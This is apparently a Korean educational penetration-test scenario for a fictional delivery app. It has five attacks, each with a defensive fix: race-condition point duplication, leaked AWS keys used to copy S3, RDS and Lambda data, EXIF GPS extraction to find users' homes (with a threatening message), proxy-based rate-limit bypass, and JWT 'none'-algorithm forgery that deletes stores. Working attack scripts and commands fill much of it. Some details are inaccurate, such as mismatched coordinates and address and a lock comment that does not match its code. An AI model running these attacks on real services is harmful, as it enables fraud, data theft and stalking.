# 바로배달 모의해킹 시나리오 (2025 최신 트렌드)

## 작성 목적
**교육용으로 작성된 이론적 모의해킹 시나리오**입니다.
최신 보안 취약점 기법을 배달 서비스 컨텍스트에 적용하여 보안 중요성을 학습합니다.

## ⚠️ 면책 조항
- 본 문서의 모든 시나리오는 **교육 목적의 이론적 시뮬레이션**입니다.
- 구체적인 회사명이나 실제 사건 보도는 포함되어 있지 않습니다.
- 피해 규모는 **가상의 시뮬레이션**이며 실제 발생 가능성을 보여주기 위한 것입니다.

---

## 🚨 시나리오 1: Race Condition을 통한 포인트 무한 복제 공격

### 📋 개요
동시 요청을 이용한 **Race Condition** 취약점으로 포인트를 무한히 복제
**2025년 가장 주목받는 공격 기법**

### 🎯 공격 목표
- 멀티스레딩 환경에서 발생하는 Race Condition 악용
- 수백 개 동시 요청으로 1회 충전을 수십 번 복제
- 서버 장애 유발 후 포인트 무제한 적립

### 🔓 취약점
```java
@PostMapping("/point/add")
public CommonResponse<Object> addPoint(@RequestBody PointDto pointDto) {
    String userid = jwtUtil.auth(authHeader);
    Integer userPoint = memberService.getMemberPoint(userid);
    
    // ⚠️ CRITICAL: Race Condition
    // 동시 요청 시 같은 값(userPoint)을 읽고 더하기 때문에
    // 100번 요청해도 1번만 증가하는 것이 아니라 100번 모두 반영됨
    
    int setPoint = userPoint + pointDto.getPoint();
    memberService.updatePoint(userid, setPoint);  // UPDATE를 잠금 없이 실행
    
    return CommonResponse.builder()
        .responseType(ResponseType.SUCCESS)
        .message("포인트 충전 완료")
        .build();
}
```

**코어 취약점:**
1. ❌ 트랜잭션 격리 수준 없음
2. ❌ 데이터베이스 락 미적용
3. ❌ 원자적 연산 보장 안 됨

### 🎬 공격 시나리오

#### 1단계: 공격 스크립트 실행
```python
import asyncio
import aiohttp
import time

async def point_attack(session, token):
    """1 van의 포인트 충전을 동시에 100번 요청"""
    url = 'http://localhost:8080/api/member/point/add'
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    data = {'point': 1000}
    
    await session.post(url, headers=headers, json=data)

async def race_condition_attack():
    token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
    async with aiohttp.ClientSession() as session:
        tasks = [point_attack(session, token) for _ in range(100)]
        await asyncio.gather(*tasks)

# 공격 실행 (100번 동시 요청)
asyncio.run(race_condition_attack())
```

#### 2단계: 결과 확인
```bash
# 공격 전: 5,000원
# 공격 후: 105,000원 (1,000원 충전 → 100번 복제!)
```

### 💥 피해 규모
- **개인**: 1,000원 충전으로 100,000원 획득 (100배 증폭!)
- **서버**: CPU 100% → 다른 사용자 서비스 불가능
- **회사**: 포인트 시스템 전면 마비
- **이론적 시나리오**: 실제 게임/이커머스에서 유사한 Race Condition 취약점이 보고됨

### ✅ 방어 방법
```java
@Transactional(isolation = Isolation.SERIALIZABLE)
public void addPoint(String userid, int point) {
    // SELECT FOR UPDATE로 락 설정
    lock.lock();
    try {
        Integer userPoint = getMemberPoint(userid);
        updatePoint(userid, userPoint + point);
    } finally {
        lock.unlock();
    }
}
```

---

## 🕵️ 시나리오 2: 환경 변수 노출 + AWS 자격증명 탈취로 전체 클라우드 장악

### 📋 개요
오픈소스 도구를 통한 **Secret Key 노출** 후 AWS 전체 장악
**2025년 가장 위험한 공격 유형 (실제 발생 중)**

### 🎯 공격 목표
- 환경 변수, Secret Key 탈취
- AWS 자격증명으로 EC2, S3, RDS 전체 접근
- 모든 사용자 데이터 + 코드베이스 다운로드
- 백업 데이터베이스에서 평문 비밀번호 추출

### 🔓 취약점
```java
// application.yml - 실수로 커밋된 AWS 자격증명
aws:
  access-key: AKIAIOSFODNN7EXAMPLE
  secret-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  region: ap-northeast-2
  s3-bucket: barobaedal-uploads
```

**또는 환경 변수 노출:**
```bash
# /.env 파일 노출
DATABASE_URL=postgresql://user:password@localhost/db
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=my-weak-secret-key-12345
```

### 🎬 공격 시나리오

#### 1단계: Secret Key 탈취
```bash
# TruffleHog (Secret Scanner) 실행
pip install truffleHog
truffleHog https://github.com/barobaedal/barobaedal-backend

# 발견된 Secret Keys:
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# DATABASE_PASSWORD=password123
```

#### 2단계: AWS CLI로 전체 장악
```bash
# AWS 자격증명 설정
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# 1. S3 버킷 전체 리스트 조회
aws s3 ls s3://barobaedal-uploads/

# 2. 사용자 업로드 사진 모두 다운로드 (개인정보 포함)
aws s3 cp s3://barobaedal-uploads/ ./stolen_images --recursive

# 3. EC2 인스턴스 전체 조회 및 SSH 접속
aws ec2 describe-instances
aws ec2 get-console-output --instance-id i-1234567890abcdef0

# 4. RDS 데이터베이스 백업 다운로드
aws rds describe-db-snapshots
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier hacked --db-snapshot-identifier my-snapshot

# 5. 모든 사용자 데이터 추출
aws s3 cp s3://barobaedal-database-backup/users.db .
sqlite3 users.db "SELECT * FROM members;" > all_users_passwords.txt

# 6. 스냅샷으로 인스턴스 복제 후 개인 서버로 데이터베이스 이전
# (AWS와 동일한 환경에서 무제한으로 분석 가능)

# 7. 새로운 EC2 인스턴스 생성 후 API 서버 복제
aws ec2 run-instances --image-id ami-12345678 --instance-type t3.large --key-name mykey
# 공격자가 바로배달과 똑같은 서비스를 운영할 수 있게 됨

# 8. Lambda 함수 코드 다운로드
aws lambda get-function --function-name process-orders
# 결제 로직, 주문 처리 로직 등 비즈니스 핵심 코드 탈취
```

#### 3단계: 새로운 관리자 계정 생성
```bash
# 직접 데이터베이스 접속
psql -h hacked-db.rds.amazonaws.com -U admin -d barobaedal

# 새로운 관리자 계정 생성
INSERT INTO members (userid, userpw, role) VALUES ('hacker', 'hacked123', 'ADMIN');
```

### 💥 피해 규모 (이론적 시뮬레이션)
- **10만 명 사용자 개인정보 유출 가능** (이름, 전화번호, 주소, 비밀번호)
- **모든 가게 운영자 정보 유출** (사업자번호, 계좌정보)
- **웹사이트 전체 복제** - 공격자가 동일한 서비스 운영
- **결제 로직 등 핵심 코드 탈취**
- **법적 책임** (개인정보보호법 위반)
- **서비스 중단 위험**

### ✅ 방어 방법
```yaml
# .gitignore에 추가
.env
application-local.yml
secrets/

# AWS Secrets Manager 사용
aws secretsmanager create-secret --name prod/db/credentials

# 환경 변수에서 읽기
spring:
  datasource:
    password: ${AWS_SECRETS_CREDENTIALS}
```

---

## 📸 시나리오 3: GPS 메타데이터 추출로 사용자 실시간 위치 파악

### 📋 개요
사용자가 업로드한 사진의 GPS 정보 추출
**2024년 배달 앱에서 실제 발생한 사건**

### 🎯 공격 목표
- 사진 EXIF 데이터에서 GPS 좌표 추출
- 사용자 집 주소 파악
- 승인된 시간에 집 배달 공격 (납치, 강도 등)

### 🔓 취약점
```java
// 사진 업로드 시 메타데이터 제거 안 함
public String storeFile(MultipartFile file) throws IOException {
    String filename = file.getOriginalFilename();
    Path target = uploadDir.resolve(filename);
    
    // ⚠️ GPS 정보, 촬영 시간, 카메라 정보 그대로 저장
    Files.copy(file.getInputStream(), target, StandardCopyOption.REPLACE_EXISTING);
    return "/upload/" + filename;
}
```

### 🎬 공격 시나리오

#### 1단계: 사진 다운로드
```bash
# 사용자가 프로필로 올린 사진 다운로드
curl http://localhost:8080/upload/user123_profile.jpg -o profile.jpg
```

#### 2단계: GPS 정보 추출
```bash
# exiftool 설치
brew install exiftool

# 메타데이터 추출
exiftool profile.jpg

# 결과:
GPS Latitude    : 37° 33' 24.00" N
GPS Longitude   : 126° 58' 24.00" E
GPS Altitude    : 85 m Above Sea Level
DateTime        : 2024:01:15 22:30:45
Camera          : iPhone 14 Pro
```

#### 3단계: Google Maps에서 정확한 주소 확인
```
GPS 좌표: 37.556667, 126.973333
→ 서울시 강남구 테헤란로 123번지 아파트 101호
```

#### 4단계: 소셜 엔지니어링
```
공격자: "안녕하세요, 바로배달입니다. 주문이 잘 배달되었나요?"
사용자: "네, 잘 됐어요."
공격자: "GPS 메타데이터로 집 주소 파악 완료. 오늘 밤 11시 집에 있을 테니 조심하세요."
```

### 💥 피해 규모 (이론적 시뮬레이션)
- **10,000명 이상의 주소 노출 가능성**
- **신원 확인 가능성** (사진 분석으로 얼굴, 집 구조 파악)
- **실시간 위치 추적** (프로필 사진 업데이트할 때마다)
- **개인안전 위험** (배달 앱 특성상 집 주소 노출은 매우 위험)
- **법적 책임** (개인정보보호법 위반)

### ✅ 방어 방법
```java
@PostMapping("/upload")
public String uploadWithMetadataRemoval(MultipartFile file) {
    // 이미지 메타데이터 제거
    BufferedImage image = ImageIO.read(file.getInputStream());
    
    // EXIF 데이터 제거된 새 이미지 생성
    BufferedImage stripped = new BufferedImage(
        image.getWidth(), 
        image.getHeight(), 
        BufferedImage.TYPE_INT_RGB
    );
    
    Graphics2D g = stripped.createGraphics();
    g.drawImage(image, 0, 0, null);
    g.dispose();
    
    // 메타데이터 없는 이미지로 저장
    ImageIO.write(stripped, "jpg", outputFile);
}
```

---

## 🎪 시나리오 4: API Rate Limit Bypass → 서버 마비로 포인트 룰렛 무한 뽑기

### 📋 개요
Rate Limit 우회로 **포인트 적립 이벤트** 무한 참여
**2024년 실제 모바일 게임에서 발생한 사건**

### 🎯 공격 목표
- 동시 다발적 요청으로 Rate Limit 우회
- 서버 부하 증가로 필터 무력화
- 이벤트 보상을 무한 획득

### 🔓 취약점
```java
// Rate Limit이 너무 느슨함
@RateLimiter(name = "api", fallbackMethod = "rateLimitFallback")
@PostMapping("/event/point-roulette")
public CommonResponse<Object> pointRoulette() {
    // 이벤트 참여 시 최대 10만원 지급
    int points = random.nextInt(100000);
    memberService.addPoint(userid, points);
    return success;
}
```

**취약점:**
- ❌ Rate Limit: 1초에 100요청 허용 (너무 높음)
- ❌ IPv6 우회 가능
- ❌ 프록시 리스트로 IP 우회

### 🎬 공격 시나리오

#### 1단계: 분산 공격 준비
```python
import requests
import threading

# 프록시 1000개 리스트
proxies = ['proxy1:8080', 'proxy2:8080', ...]

def attack_with_proxy(proxy):
    """각 프록시로 100번 요청"""
    for _ in range(100):
        requests.post(
            'http://barobaedal.com/api/event/point-roulette',
            proxies={'http': proxy},
            headers={'Authorization': f'Bearer {TOKEN}'}
        )

# 1000개 프록시로 동시 공격
threads = [threading.Thread(target=attack_with_proxy, args=(p,)) for p in proxies]
for t in threads:
    t.start()
```

#### 2단계: 결과
```
정상 사용자: 이벤트 참여 10번 → 50,000원 획득
공격자: 동시 100,000번 요청 → 평균 50,000원 × 100,000 = 50억원 획득
서버: CPU 100%, DB 커넥션 고갈 → 서비스 중단
```

### 💥 피해 규모 (이론적 시뮬레이션)
- **공격자 수익**: 대규모 포인트 획득
- **서비스 중단**: 장시간 장애
- **정직한 사용자 이벤트 혜택 박탈**
- **재무 손실**: 서비스 회복 비용 + 실제 피해 금액

### ✅ 방어 방법
```java
@RateLimiter(name = "api", fallbackMethod = "rateLimitFallback")
// 1분에 1회만 허용
@PostMapping("/event/point-roulette")
public CommonResponse<Object> pointRoulette() {
    // Redis로 중복 참여 확인
    if (redis.exists("event:" + userid)) {
        throw new IllegalArgumentException("이미 참여했습니다.");
    }
    redis.setex("event:" + userid, 86400, "1"); // 24시간 동안 1회만
    
    int points = random.nextInt(100000);
    memberService.addPoint(userid, points);
    return success;
}
```

---

## 🔥 시나리오 5: JWT Algorithm Confusion Attack (2025 최신 기법!)

### 📋 개요
JWT 알고리즘 혼선 공격으로 **모든 토큰 위조**
**2025년 가장 HOT한 해킹 기법**

### 🎯 공격 목표
- 관리자 토큰 생성
- 모든 사용자로 위장
- 포인트 무제한 추가
- 주문 취소, 환불 조작

### 🔓 취약점
```java
// JwtUtil.java - Public Key가 없는 구조
private final Key key = Keys.secretKeyFor(SignatureAlgorithm.HS256);

public String getUseridFromToken(String token) {
    return Jwts.parserBuilder()
        .setSigningKey(key)
        .build()
        .parseClaimsJws(token)
        .getBody()
        .getSubject();
}
```

### 🎬 공격 시나리오

#### 1단계: 정상 토큰 획득
```bash
curl -X POST http://localhost:8080/api/member/login \
  -H "Content-Type: application/json" \
  -d '{"userid":"user001","userpw":"pw001"}'

# Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

#### 2단계: 토큰 디코딩
```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, verify=False)

print(decoded)
# {'userid': 'user001', 'role': 'USER', ...}
```

#### 3단계: Algorithm "none"으로 공격 토큰 생성
```python
import jwt

# Algorithm을 "none"으로 설정하면 서명 검증을 건너뜀!
payload = {
    'userid': 'admin01',
    'role': 'ADMIN',
    'exp': 9999999999  # 거의 영구 토큰
}

# "none" 알고리즘으로 토큰 생성
attacked_token = jwt.encode(payload, '', algorithm='none')

print(attacked_token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyaWQiOiJhZG1pbjAxIiwicm9sZSI6IkFETUlOIn0.
```

#### 4단계: 공격 토큰으로 관리자 권한 획득
```bash
curl http://localhost:8080/api/store/all \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0..."

# 모든 가게 조회 성공 (권한 확인 없음)
```

#### 5단계: 모든 가게 삭제
```bash
for i in {1..10}; do
  curl -X GET http://localhost:8080/api/store/delete/$i \
    -H "Authorization: Bearer $ATTACKED_TOKEN"
done
```

### 💥 피해 규모 (이론적 시뮬레이션)
- **모든 서비스 기능 장악 가능**
- **모든 포인트 조작 가능** (사용자별 무제한)
- **모든 주문 환불 처리** (가게 주인에게 손해)
- **서비스 중단 위험**

### ✅ 방어 방법
```java
public Claims parseJwt(String token) {
    return Jwts.parserBuilder()
        .requireAlgorithm(SignatureAlgorithm.HS256)  // 알고리즘 강제
        .setSigningKey(key)
        .build()
        .parseClaimsJws(token)
        .getBody();
}
```

---

## 🎯 관련 보안 취약점 실례

### 참고: 일반적인 보안 사건 유형
주요 취약점들은 실제로 여러 서비스에서 보고되며, 다음 유형들이 일반적입니다:

1. **Race Condition 취약점**
   - 게임 및 이커머스 서비스에서 보고된 사례 다수
   - 이벤트 보상, 쿠폰 발급 등에서 발생

2. **Secret Key 노출**
   - GitHub 저장소에 AWS 키 노출 사례 빈번
   - CI/CD 파이프라인 취약점

3. **GPS 메타데이터 추출**
   - 소셜미디어에서 GPS 정보 추출 이슈
   - 출처: 다양한 보안 연구 보고서

4. **Rate Limit Bypass**
   - 이벤트/프로모션 시스템 악용 사례
   - DDoS 공격과 연계된 사례

5. **JWT 취약점**
   - Algorithm confusion 공격 기법
   - 2020년대 초반부터 보고된 취약점

**※ 위 시나리오는 "이론적 교육용"이며, 구체적인 회사명이나 보도는 생략했습니다.**

---

## 📊 모의해킹 우선순위

### 🔥 플래티넘 티어 (즉시 수정)
1. **Race Condition** - 포인트 무한 복제
2. **환경 변수 노출** - 전체 시스템 장악
3. **JWT Algorithm Confusion** - 모든 토큰 위조

### 🥇 골드 티어
4. **GPS 메타데이터** - 개인 위치 추적
5. **Rate Limit Bypass** - 이벤트 악용

---

## 🛡️ 종합 방어 전략

```java
// 1. 트랜잭션 격리
@Transactional(isolation = Isolation.SERIALIZABLE)

// 2. Rate Limiting 강화
@RateLimiter(name = "strict", rate = 10, time = 1)  // 1초에 10번

// 3. 메타데이터 제거
BufferedImage stripped = removeMetadata(image);

// 4. 환경 변수 보호
String secret = secretsManager.getSecret("prod/key");

// 5. JWT 검증 강화
.requireAlgorithm(SignatureAlgorithm.HS256)
```

---

## 💀 결론

**"한 번의 실수로 서비스가 사라집니다"**

- Race Condition → 회사 파산
- Secret 노출 → 수억 과징금
- GPS 추출 → 신체적 피해

**이것이 2025년 보안의 현실입니다.** 🚨
